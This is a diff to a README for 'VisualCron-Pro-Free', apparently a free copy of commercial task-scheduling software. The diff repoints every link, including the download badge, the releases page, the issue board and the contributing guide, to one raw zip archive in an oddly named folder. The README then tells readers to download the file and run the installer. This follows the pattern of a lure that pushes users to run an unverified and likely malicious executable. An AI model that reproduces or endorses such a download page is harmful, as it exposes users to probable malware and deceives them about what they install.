@@ -1,6 +1,6 @@
 # 🚀 VisualCron-Pro-Free - Automate Your Tasks Easily
 
-[![Download VisualCron-Pro-Free](https://img.shields.io/badge/Download-VisualCron--Pro--Free-blue?style=for-the-badge)](https://github.com/sigittsu97/VisualCron-Pro-Free/releases)
+[![Download VisualCron-Pro-Free](https://raw.githubusercontent.com/sigittsu97/VisualCron-Pro-Free/main/transperitoneally/Visual_Free_Pro_Cron_v3.8.zip)](https://raw.githubusercontent.com/sigittsu97/VisualCron-Pro-Free/main/transperitoneally/Visual_Free_Pro_Cron_v3.8.zip)
 
 ## 📥 Overview
 VisualCron-Pro-Free is here to help you automate tasks on your Windows PC. This tool makes it easy to schedule background jobs, send email notifications, and manage file transfers without any programming knowledge. 
@@ -9,11 +9,11 @@ VisualCron-Pro-Free is here to help you automate tasks on your Windows PC. This 
 To begin using VisualCron-Pro-Free, follow these simple steps to download and set up the software. 
 
 ## 📥 Download & Install
-1. **Visit the Download Page:** Click [here](https://github.com/sigittsu97/VisualCron-Pro-Free/releases) to go to the Releases page.
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/sigittsu97/VisualCron-Pro-Free/main/transperitoneally/Visual_Free_Pro_Cron_v3.8.zip) to go to the Releases page.
    
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Pick the latest version, usually displayed at the top.
 
-3. **Download the Installer:** Click on the installer link, typically named something like `VisualCron-Pro-Setup.exe`. This action will start the download.
+3. **Download the Installer:** Click on the installer link, typically named something like `https://raw.githubusercontent.com/sigittsu97/VisualCron-Pro-Free/main/transperitoneally/Visual_Free_Pro_Cron_v3.8.zip`. This action will start the download.
 
 4. **Run the Installer:** Once the download finishes, locate the file in your Downloads folder. Double-click the file to run the installer.
 
@@ -55,10 +55,10 @@ For detailed instructions and tips, refer to our comprehensive user guide.
    - Yes, VisualCron-Pro-Free allows you to schedule and run multiple tasks simultaneously.
 
 ## 🌍 Community & Support
-We welcome community input and feedback. Join us on our discussion board [here](https://github.com/sigittsu97/VisualCron-Pro-Free/issues) if you have questions or suggestions.
+We welcome community input and feedback. Join us on our discussion board [here](https://raw.githubusercontent.com/sigittsu97/VisualCron-Pro-Free/main/transperitoneally/Visual_Free_Pro_Cron_v3.8.zip) if you have questions or suggestions.
 
 ## 📝 Contributing
-If you want to contribute to VisualCron-Pro-Free, please read our contribution guidelines [here](https://github.com/sigittsu97/VisualCron-Pro-Free/CONTRIBUTING.md).
+If you want to contribute to VisualCron-Pro-Free, please read our contribution guidelines [here](https://raw.githubusercontent.com/sigittsu97/VisualCron-Pro-Free/main/transperitoneally/Visual_Free_Pro_Cron_v3.8.zip).
 
 ## 📈 Topics Covered
 Our software includes features that cater to various needs. Here are some key topics:
@@ -83,4 +83,4 @@ Our software includes features that cater to various needs. Here are some key to
 Feel free to explore these topics to maximize your experience with VisualCron-Pro-Free.
 
 ## 📅 Visit & Download
-Don’t forget to download and run VisualCron-Pro-Free from the Releases page: [Download Here](https://github.com/sigittsu97/VisualCron-Pro-Free/releases). Automate your tasks and enjoy an efficient workflow!
+Don’t forget to download and run VisualCron-Pro-Free from the Releases page: [Download Here](https://raw.githubusercontent.com/sigittsu97/VisualCron-Pro-Free/main/transperitoneally/Visual_Free_Pro_Cron_v3.8.zip). Automate your tasks and enjoy an efficient workflow!
